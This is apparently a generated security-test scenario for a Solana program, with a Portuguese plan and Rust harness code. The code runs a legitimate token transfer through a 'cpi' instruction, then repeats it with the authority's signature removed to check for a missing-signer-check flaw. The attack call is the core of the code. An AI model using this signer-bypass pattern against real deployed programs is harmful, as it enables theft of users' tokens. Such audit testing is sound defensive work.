{
  "plan": "O cenario monta contas SPL Token reais (mint, source, destination) e uma authority que nao assina. O baseline executa a instrucao `cpi` com a authority assinando, provando que o cenario esta correto. O ataque repete a mesma chamada removendo a assinatura da authority. O efeito mede se os tokens foram movidos de source para destination sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let mint = Pubkey::new_unique();

let token_program_id = spl_token::id();

let source_data = anchor_account_data("Account", &(mint, authority, 1000u64, 0u8, 0u8));
let dest_data = anchor_account_data("Account", &(mint, authority, 0u64, 0u8, 0u8));

let source_acc = account(&token_program_id, &source_data, None);
let dest_acc = account(&token_program_id, &dest_data, None);
let authority_acc = wallet(1_000_000_000);

let contas = vec![
    (source, source_acc.clone()),
    (destination, dest_acc.clone()),
    (authority, authority_acc.clone()),
    (token_program_id, program_account(&token_program_id)),
];

let metas = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(token_program_id, false),
];

let ix = env.anchor_ix("cpi", &(100u64,), metas);
let baseline = env.baseline("transferencia legitima com authority assinando", &ix, &contas);

let metas_ataque = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new_readonly(token_program_id, false),
];

let ix_ataque = env.anchor_ix("cpi", &(100u64,), metas_ataque);
let r = env.attack("transferencia sem assinatura da authority", &ix_ataque, &contas);

if r.program_result == ProgramResult::Success {
    let dest_after = after(&r, &destination);
    let source_after = after(&r, &source);
    let dest_amount = read_u64(dest_after.data(), 64);
    let source_amount = read_u64(source_after.data(), 64);
    env.effect("tokens movidos sem assinatura da authority", dest_amount == 100 && source_amount == 900);
}"
}

